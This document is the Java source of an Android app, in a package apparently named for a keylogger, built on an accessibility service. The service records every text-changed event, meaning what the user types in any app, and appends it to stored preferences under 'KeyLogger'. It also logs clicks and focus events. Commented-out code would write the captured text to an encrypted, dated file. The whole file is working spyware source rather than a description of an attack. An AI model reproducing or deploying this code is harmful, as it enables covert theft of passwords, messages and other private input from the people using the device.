package com.gpow.androidkeylogger;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.SharedPreferences;
import android.preference.PreferenceManager;
import android.view.accessibility.AccessibilityEvent;

import com.facebook.android.crypto.keychain.AndroidConceal;
import com.facebook.android.crypto.keychain.SharedPrefsBackedKeyChain;
import com.facebook.crypto.Crypto;
import com.facebook.crypto.CryptoConfig;
import com.facebook.crypto.Entity;
import com.facebook.crypto.keychain.KeyChain;
import com.facebook.crypto.util.SystemNativeCryptoLibrary;

import java.io.BufferedOutputStream;
import java.io.FileOutputStream;
import java.io.OutputStream;
import java.text.SimpleDateFormat;
import java.util.Date;

public class KeyLoggerAccessibilityService extends AccessibilityService {

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        final int eventType = event.getEventType();
        String eventText = null;
        switch(eventType) {
        /*
            You can use catch other events like touch and focus
        */

            case AccessibilityEvent.TYPE_VIEW_CLICKED:
                 eventText = "Clicked: ";
                 break;
            case AccessibilityEvent.TYPE_VIEW_FOCUSED:
                 eventText = "Focused: ";
                 break;
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                eventText = "Typed: ";
                saveContents("" + event.getText());
                break;
        }
        eventText = eventText + event.getText();

        //print the typed text in the console. Or do anything you want here.
        System.out.println("ACCESSIBILITY SERVICE : "+eventText);

    }

    @Override
    public void onInterrupt() {
        //whatever
    }

    @Override
    public void onServiceConnected() {
        //configure our Accessibility service
        AccessibilityServiceInfo info=getServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_SPOKEN;
        info.notificationTimeout = 100;
        this.setServiceInfo(info);
    }

    private void saveContents(String logs) {
        try {
//            /// Creates a new Crypto object with default implementations of a key chain
//            KeyChain keyChain = new SharedPrefsBackedKeyChain(MainActivity.getContext(), CryptoConfig.KEY_256);
//            Crypto crypto = AndroidConceal.get().createDefaultCrypto(keyChain);
//
//            // Check for whether the crypto functionality is available
//            // This might fail if Android does not load libaries correctly.
//            if (!crypto.isAvailable()) {
//                return;
//            }
//
//            OutputStream fileStream = new BufferedOutputStream(
//                    new FileOutputStream(getFilename()));
//
//            // Creates an output stream which encrypts the data as
//            // it is written to it and writes it out to the file.
//            OutputStream outputStream = crypto.getCipherOutputStream(
//                    fileStream,
//                    Entity.create("entity_id"));
//
//            // Write plaintext to it.
//            outputStream.write(logs);
//            outputStream.close();
            SharedPreferences preferences = PreferenceManager.getDefaultSharedPreferences(this);
            String oldLogs = preferences.getString("KeyLogger", "");
            preferences = PreferenceManager.getDefaultSharedPreferences(this);
            SharedPreferences.Editor editor = preferences.edit();
            editor.putString("KeyLogger", oldLogs + logs);
            editor.apply();
        }
        catch (Exception e) {
            e.printStackTrace();
        }
    }

    private String getFilename() {
        String date = new SimpleDateFormat("dd-MM-yyyy").format(new Date());
        return date+"_loglogs";
    }
}
